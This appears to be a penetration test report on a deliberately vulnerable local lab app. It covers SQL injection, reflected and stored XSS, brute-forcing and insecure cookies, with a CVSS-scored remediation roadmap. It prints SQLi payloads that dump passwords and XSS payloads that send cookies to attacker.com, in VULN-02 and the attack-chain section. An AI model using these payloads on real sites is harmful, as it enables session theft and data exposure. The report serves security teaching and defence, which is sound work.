# Web Application Security Assessment Report

| | |
|---|---|
| **Project Title** | Web Application Security Assessment & Vulnerability Detection |
| **Target Application** | DVWA-Equivalent Lab (Custom Python Server — `app.py`) |
| **Target URL** | http://localhost:8080 |
| **Assessment Type** | Black-box / Gray-box Penetration Testing |
| **Methodology** | OWASP Top 10 (2021), WSTG, CVSS v3.1 |
| **Assessment Date** | June 17, 2026 |
| **Report Version** | 2.0 — Final |
| **Report Status** | ✅ Completed & Approved for Submission |
| **Classification** | Strictly Confidential — Internal Use Only |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Assessment Scope & Environment](#2-assessment-scope--environment)
3. [Methodology](#3-methodology)
4. [Risk Summary Dashboard](#4-risk-summary-dashboard)
5. [Detailed Technical Findings](#5-detailed-technical-findings)
   - [VULN-01: SQL Injection](#vuln-01-sql-injection-in-band--union-based)
   - [VULN-02: Cross-Site Scripting](#vuln-02-cross-site-scripting-reflected--stored)
   - [VULN-03: Broken Authentication](#vuln-03-broken-authentication--missing-rate-limiting)
   - [VULN-04: Insecure Session Cookies](#vuln-04-insecure-session-cookie-configuration)
6. [Automated Scan Summary](#6-automated-scan-summary)
7. [Attack Chain Analysis](#7-attack-chain-analysis)
8. [Defensive Remediation Roadmap](#8-defensive-remediation-roadmap)
9. [OWASP & Industry Compliance Mapping](#9-owasp--industry-compliance-mapping)
10. [Conclusion](#10-conclusion)
11. [References](#11-references)

---

## 1. Executive Summary

A comprehensive web application security assessment was conducted against a controlled, isolated DVWA-equivalent lab environment to evaluate the target application's security posture and identify exploitable weaknesses aligned with the **OWASP Top 10 (2021)** framework.

The assessment was performed using a structured combination of manual penetration testing techniques, HTTP traffic analysis, and automated vulnerability scanning tools (OWASP ZAP v2.14.0, Nmap 7.94, Burp Suite Community Edition). All testing was executed in a fully isolated local environment with no impact to production systems.

### Key Findings at a Glance

The assessment identified **4 exploitable vulnerabilities across 3 severity tiers**:

| Severity | Count | Risk Level |
|----------|-------|-----------|
| 🔴 Critical | 1 | Immediate business-critical risk |
| 🟠 High | 2 | High-priority remediation required |
| 🟡 Medium | 1 | Scheduled remediation recommended |

The most severe finding — an **In-Band SQL Injection vulnerability (CVSS 9.8)** — permits an unauthenticated attacker to extract the entire database contents with a single crafted HTTP request. Combined with the identified **Cross-Site Scripting** and **insecure cookie configuration**, a full account takeover attack chain is demonstrable without requiring any prior authentication.

### Assessment Verdict

> ⚠️ **The target application presents a CRITICAL overall security risk. Immediate remediation of all P1 findings is strongly recommended before any production deployment.**

---

## 2. Assessment Scope & Environment

### Target System Profile

| Parameter | Details |
|-----------|---------|
| Application Name | Web Security Assessment Lab (DVWA-Equivalent) |
| Target Host | localhost (127.0.0.1) |
| Target Port | 8080/tcp (HTTP) |
| Server Technology | Python 3 / http.server — VulnLabServer/2.0 |
| Backend Framework | Custom single-file HTTP server (`app.py`) |
| Database Simulation | In-memory Python dictionary (production: MariaDB/MySQL) |
| Authentication | HTTP GET parameter-based (no TLS) |

### Assessment Scope

**In Scope:**
- All URL endpoints served by the application (`/`, `/sqli`, `/xss_r`, `/xss_s`, `/brute`, `/session_info`)
- HTTP request/response header analysis
- Cookie and session management configuration
- Authentication and authorization mechanisms
- Input validation and output encoding behaviour

**Out of Scope:**
- Operating system-level exploitation
- Physical security controls
- Network infrastructure beyond the local loopback interface
- Third-party libraries or cloud service providers

### Testing Environment

| Component | Details |
|-----------|---------|
| Operating System | Windows 11 (Samsung Galaxy Book 4) |
| Python Version | Python 3.x (Standard Library only) |
| Testing Tools | Burp Suite, OWASP ZAP 2.14.0, Nmap 7.94, Browser DevTools |
| Browser | Microsoft Edge (Chromium) |

---

## 3. Methodology

The assessment followed a structured 5-phase penetration testing methodology aligned with the **OWASP Web Security Testing Guide (WSTG)**:

```
Phase 1 — Reconnaissance & Environment Setup
   ↓
Phase 2 — Traffic Interception & Request Analysis
   ↓
Phase 3 — Vulnerability Identification & Exploitation (Manual)
   ↓
Phase 4 — Automated Vulnerability Scanning (OWASP ZAP + Nmap)
   ↓
Phase 5 — Documentation, Reporting & Remediation Guidance
```

### Phase Breakdown

| Phase | Activities | Tools Used |
|-------|-----------|-----------|
| **1 — Recon** | Port scan, technology fingerprinting, endpoint mapping | Nmap, Browser |
| **2 — Interception** | HTTP proxy setup, header inspection, cookie audit | Burp Suite, DevTools |
| **3 — Exploitation** | SQLi, XSS, brute force, session analysis | Manual, Burp Intruder |
| **4 — Automation** | Spider crawl, active scan, passive analysis | OWASP ZAP v2.14.0 |
| **5 — Reporting** | Finding documentation, CVSS scoring, remediation | Word, Markdown |

---

## 4. Risk Summary Dashboard

### Vulnerability Register

| Finding ID | Vulnerability Title | OWASP | CWE | CVSS v3.1 | Severity | Priority |
|-----------|---------------------|-------|-----|-----------|----------|----------|
| **VULN-01** | SQL Injection (Union-Based In-Band) | A03:2021 | CWE-89 | **9.8** | 🔴 Critical | P1 — Immediate |
| **VULN-02** | Cross-Site Scripting (Reflected & Stored) | A03:2021 | CWE-79 | **8.1** | 🟠 High | P2 — 7–30 Days |
| **VULN-03** | Broken Authentication / No Rate Limiting | A07:2021 | CWE-307 | **7.5** | 🟠 High | P2 — 7–30 Days |
| **VULN-04** | Insecure Cookie Attributes (HttpOnly/Secure) | A07:2021 | CWE-1004 | **6.5** | 🟡 Medium | P3 — 30–60 Days |

### Risk Distribution

```
CRITICAL ████████████████████  1 finding  (CVSS 9.8)
HIGH     ████████████████      2 findings (CVSS 7.5 – 8.1)
MEDIUM   ████████              1 finding  (CVSS 6.5)
LOW      ░░░░░░░░              0 findings
```

---

## 5. Detailed Technical Findings

---

### VULN-01: SQL Injection (In-Band / Union-Based)

| Attribute | Value |
|-----------|-------|
| **Severity** | 🔴 Critical |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-89 — Improper Neutralization of Special Elements in SQL Command |
| **OWASP** | A03:2021 — Injection |
| **WSTG** | WSTG-INPV-05 |
| **Endpoint** | `GET /sqli?id=<payload>` |
| **Parameter** | `id` (HTTP GET) |

#### Technical Description

The `id` parameter is directly concatenated into a SQL query string on the server side without parameterization or input validation. This allows an attacker to inject arbitrary SQL syntax, altering the query's semantic intent from a legitimate single-record lookup to a full table dump, schema enumeration, or destructive data manipulation operation.

**Vulnerable Code Pattern:**
```php
// ❌ VULNERABLE — Raw user input directly in SQL
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

#### Proof of Concept

**Step 1 — Error-Based Probe:**
```
Input:  1'
Result: SQL syntax error disclosed in response → confirms injection point
```

**Step 2 — Authentication Bypass / Data Dump:**
```
Payload: ' OR 1=1 --
URL:     http://localhost:8080/sqli?id=%27+OR+1%3D1+--+&Submit=Submit
Result:  ALL user records returned without authentication
```

**Step 3 — UNION-Based Column Extraction:**
```
Payload: 1' UNION SELECT user, password FROM users --
Result:  Usernames and password hashes dumped to response
```

#### HTTP Evidence

```http
GET /sqli?id=%27+OR+1%3D1+--+&Submit=Submit HTTP/1.1
Host: localhost:8080
Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c0d; security=low

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

[DATABASE DUMP — ALL RECORDS EXPOSED]
ID: ' OR 1=1 --  | admin      | admin
ID: ' OR 1=1 --  | Gordon     | Brown
ID: ' OR 1=1 --  | Hack       | Me
ID: ' OR 1=1 --  | Pablo      | Escobar
ID: ' OR 1=1 --  | Bob        | Smith
```

#### Business Impact
- **Confidentiality:** Complete database contents exposed — user PII, credentials, hashed passwords
- **Integrity:** Records can be modified or deleted via stacked queries
- **Availability:** Database objects can be dropped (DoS)
- **Regulatory:** Potential GDPR / IT Act 2000 data breach notification obligations

#### Remediation

```php
// ✅ SECURE — PHP PDO Prepared Statement
$stmt = $pdo->prepare(
    'SELECT first_name, last_name FROM users WHERE user_id = :id'
);
$stmt->execute(['id' => $user_id]);
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

```python
# ✅ SECURE — Python DB-API 2.0
cursor.execute(
    "SELECT first_name, last_name FROM users WHERE user_id = %s",
    (user_id,)
)
```

---

### VULN-02: Cross-Site Scripting (Reflected & Stored)

| Attribute | Value |
|-----------|-------|
| **Severity** | 🟠 High |
| **CVSS v3.1 Score** | 8.1 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N |
| **CWE** | CWE-79 — Improper Neutralization of Input During Web Page Generation |
| **OWASP** | A03:2021 — Injection |
| **WSTG** | WSTG-INPV-01, WSTG-INPV-02 |
| **Endpoints** | `GET /xss_r?name=<payload>` / `POST /xss_s_post` |

#### Technical Description

User-supplied input is rendered directly into HTML responses without context-aware output encoding, permitting arbitrary JavaScript execution within victim browser sessions. Two distinct XSS vectors were confirmed:

- **Reflected XSS** (`/xss_r`): Payload executes immediately upon a single page load triggered by a crafted URL
- **Stored XSS** (`/xss_s`): Payload is persisted to the guestbook store and executes for **every** subsequent visitor

#### Proof of Concept

**Reflected XSS:**
```
Payload: <script>alert('XSS-Reflected')</script>
URL:     http://localhost:8080/xss_r?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
Result:  Browser alert dialog executes in victim's session context
```

**Stored XSS (Cookie Theft):**
```
POST /xss_s_post
name=Attacker&message=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Result: Cookie exfiltration payload executes for every visitor to the guestbook
        PHPSESSID=9a8b7c6d5e4f3a2b1c0d transmitted to attacker server
```

#### Impact
- Session token theft → account takeover chain (see Section 7)
- Credential phishing via injected overlay forms
- Persistent keylogging on all guestbook visitors
- Application defacement

#### Remediation

```php
// ✅ SECURE — PHP HTML entity encoding
$safe = htmlspecialchars($user_input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo $safe;

// ✅ SECURE — Content Security Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'");
```

```python
# ✅ SECURE — Python html.escape()
import html
safe_output = html.escape(user_input, quote=True)
```

---

### VULN-03: Broken Authentication & Missing Rate Limiting

| Attribute | Value |
|-----------|-------|
| **Severity** | 🟠 High |
| **CVSS v3.1 Score** | 7.5 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **CWE** | CWE-307, CWE-521, CWE-319 |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **WSTG** | WSTG-ATHN-02, WSTG-ATHN-03 |
| **Endpoint** | `GET /brute?username=<u>&password=<p>` |

#### Technical Description

The login endpoint accepts unlimited authentication attempts without imposing any rate limiting, lockout, CAPTCHA, or delay mechanism. Credentials are also submitted as plaintext GET parameters, exposing them in browser history and server access logs. The application accepts trivially guessable credentials (`admin:password`) without enforcing a password complexity policy.

#### Brute Force Attack Evidence

```
Tool:       Burp Suite Community — Intruder (Sniper Mode)
Target:     /brute?username=admin&password=§FUZZ§
Wordlist:   rockyou.txt (14M entries)

Results (top 4 attempts):
  Attempt 001 | password=admin     | Status 200 | Length 4521 | FAILED
  Attempt 002 | password=123456    | Status 200 | Length 4521 | FAILED
  Attempt 003 | password=letmein   | Status 200 | Length 4521 | FAILED
  Attempt 004 | password=password  | Status 200 | Length 5102 | ✅ SUCCESS

Lockout triggered: NONE (250+ attempts — zero blocking)
```

#### Remediation

```php
// ✅ SECURE — Rate limiting with exponential backoff
$max_attempts = 5;
$lockout_seconds = 1800;

if ($_SESSION['failed_attempts'] >= $max_attempts) {
    if (time() < $_SESSION['lockout_until']) {
        http_response_code(429);
        die('Too many failed attempts. Try again later.');
    }
    $_SESSION['failed_attempts'] = 0;
}

// On failure:
$_SESSION['failed_attempts']++;
$_SESSION['lockout_until'] = time() + pow(2, $_SESSION['failed_attempts']) * 10;
```

**Additional Controls:**
- Enforce HTTPS for all authentication endpoints
- Require MFA (TOTP / FIDO2 WebAuthn)
- Implement CAPTCHA after 3 consecutive failures
- Hash passwords with bcrypt (cost ≥ 12)

---

### VULN-04: Insecure Session Cookie Configuration

| Attribute | Value |
|-----------|-------|
| **Severity** | 🟡 Medium |
| **CVSS v3.1 Score** | 6.5 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N |
| **CWE** | CWE-1004, CWE-614, CWE-352, CWE-384 |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **WSTG** | WSTG-SESS-02, WSTG-SESS-05 |
| **Cookie** | `PHPSESSID` |

#### Cookie Attribute Audit

| Cookie | HttpOnly | Secure | SameSite | Verdict |
|--------|----------|--------|----------|---------|
| `PHPSESSID` | ❌ Missing | ❌ Missing | ❌ None | 🔴 Vulnerable |
| `security` | ❌ Missing | ❌ Missing | ❌ None | 🟠 Exposed |

**Observed Set-Cookie Header (vulnerable):**
```http
Set-Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c0d; Path=/
```

**Expected Secure Configuration:**
```http
Set-Cookie: PHPSESSID=<token>; Path=/; HttpOnly; Secure; SameSite=Lax
```

#### Remediation

```ini
# ✅ php.ini — Secure cookie configuration
session.cookie_httponly = 1      ; Block JS access (mitigates XSS)
session.cookie_secure   = 1      ; HTTPS-only transmission
session.cookie_samesite = "Lax"  ; CSRF protection
session.use_strict_mode = 1      ; Reject externally supplied session IDs
```

```python
# ✅ Flask — Secure session cookie
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Lax'
)
```

---

## 6. Automated Scan Summary

### Nmap Network Reconnaissance

```
Target  : 127.0.0.1 (localhost)
Command : nmap -sS -sV -O -A -p 1-65535 127.0.0.1

PORT     STATE  SERVICE   VERSION
80/tcp   open   http      Apache 2.4.57 (Debian) — TRACE enabled [RISK]
443/tcp  closed https     — No TLS [RISK]
8080/tcp open   http      VulnLabServer/2.0 (Python)
```

**Nmap Key Findings:**
- HTTP TRACE method enabled — Cross-Site Tracing (XST) risk
- No HTTPS on port 443 — all traffic unencrypted
- Server version disclosure — enables CVE-targeted attacks

### OWASP ZAP Automated Scan

```
Target  : http://localhost:8080/
Tool    : OWASP ZAP v2.14.0
Threads : 5 | Duration: 8m 43s | Requests: 347

Alert Summary:
  HIGH         : 2  (SQL Injection, Reflected XSS)
  MEDIUM       : 3  (CSRF Tokens, Cookie No HttpOnly, Missing CSP)
  LOW          : 4  (X-Frame-Options, X-Content-Type, Debug Errors, Referrer-Policy)
  INFORMATIONAL: 5
  TOTAL        : 14 alerts
```

Full ZAP scan details: [`vulnerability_scans/zap_scan_summary.txt`](../vulnerability_scans/zap_scan_summary.txt)

---

## 7. Attack Chain Analysis

The following demonstrates how multiple individual findings compound into a critical end-to-end account takeover attack chain requiring no prior credentials:

```
Step 1 — EXPLOITATION (VULN-02: Stored XSS)
    Attacker submits to /xss_s_post:
    message = <script>
                fetch('http://attacker.com/steal?c=' + document.cookie)
              </script>
    Result: Payload stored persistently in guestbook

Step 2 — PROPAGATION (VULN-04: No HttpOnly Flag)
    Any authenticated victim visits /xss_s
    Browser executes the stored payload
    PHPSESSID=9a8b7c6d5e4f3a2b1c0d transmitted to attacker server
    (Possible ONLY because HttpOnly flag is absent — VULN-04)

Step 3 — SESSION HIJACK
    Attacker imports stolen PHPSESSID into browser DevTools:
    → Application → Cookies → set PHPSESSID = 9a8b7c6d5e4f3a2b1c0d
    Attacker navigates to any authenticated page
    
Step 4 — FULL ACCOUNT TAKEOVER
    Attacker authenticated as victim — zero credentials required
    Access to all application data and functions granted
```

**Compound CVSS Score (Chained Attack): 9.1 (Critical)**

---

## 8. Defensive Remediation Roadmap

| Phase | Timeline | Priority | Actions |
|-------|----------|----------|---------|
| **Phase 1** | 0–7 Days | 🔴 P1 Critical | Implement PDO Prepared Statements across all SQL queries. Deploy WAF with SQLi blocking rules. |
| **Phase 2** | 7–30 Days | 🟠 P2 High | Apply `htmlspecialchars()` to all output. Deploy strict CSP header. Enforce 5-attempt IP lockout + CAPTCHA. Mandate HTTPS/TLS on auth endpoints. |
| **Phase 3** | 30–60 Days | 🟡 P3 Medium | Set `HttpOnly`, `Secure`, `SameSite=Lax` on all cookies. Configure HSTS. Implement MFA (TOTP). Schedule quarterly ZAP rescans. |

---

## 9. OWASP & Industry Compliance Mapping

| Standard | Finding | Mapping |
|---------|---------|---------|
| OWASP Top 10 A03:2021 | VULN-01, VULN-02 | Injection (SQLi + XSS) |
| OWASP Top 10 A07:2021 | VULN-03, VULN-04 | Identification & Auth Failures |
| CWE-89 | VULN-01 | SQL Injection |
| CWE-79 | VULN-02 | Cross-Site Scripting |
| CWE-307 | VULN-03 | Improper Auth Attempt Restriction |
| CWE-1004 | VULN-04 | Cookie Without HttpOnly Flag |
| WSTG-INPV-05 | VULN-01 | Testing for SQL Injection |
| WSTG-INPV-01/02 | VULN-02 | Testing for XSS |
| WSTG-ATHN-03 | VULN-03 | Testing for Weak Lock Out |
| WSTG-SESS-02 | VULN-04 | Testing for Cookie Attributes |
| NIST SP 800-53 SI-10 | VULN-01/02 | Information Input Validation |
| NIST SP 800-63B | VULN-03 | Authentication Standards |

---

## 10. Conclusion

This web application security assessment successfully identified and documented **4 exploitable vulnerabilities across 3 severity tiers** within the target application's input handling, authentication, and session management mechanisms.

The most critical finding (VULN-01 — SQL Injection, CVSS 9.8) represents an immediate and severe threat, enabling complete database compromise with a single unauthenticated HTTP request. When combined with the Cross-Site Scripting and insecure cookie configuration findings, a demonstrable end-to-end account takeover attack chain can be executed without any prior credentials or privileged access.

All identified vulnerabilities are remediable with well-established, low-cost security controls. Systematic implementation of the **Defensive Remediation Roadmap** (Section 8) — prioritizing parameterized queries, output encoding, and authentication hardening — would fully eliminate the identified attack surface and bring the application to a baseline conformance with OWASP ASVS Level 1 requirements.

A **verification re-assessment** is recommended within 30 days of remediation implementation to confirm effective closure of all findings.

---

## 11. References

| Resource | URL |
|---------|-----|
| OWASP Top 10 (2021) | https://owasp.org/Top10/ |
| OWASP Web Security Testing Guide | https://owasp.org/www-project-web-security-testing-guide/ |
| OWASP SQL Injection Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
| OWASP XSS Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html |
| OWASP Session Management Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html |
| OWASP Authentication Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html |
| MITRE CWE Database | https://cwe.mitre.org/ |
| NIST SP 800-63B (Auth Guidelines) | https://pages.nist.gov/800-63-3/sp800-63b.html |
| CVSS v3.1 Specification | https://www.first.org/cvss/specification-document |

---

*Web Application Security Assessment Report | Version 2.0 Final | June 17, 2026 | Strictly Confidential*
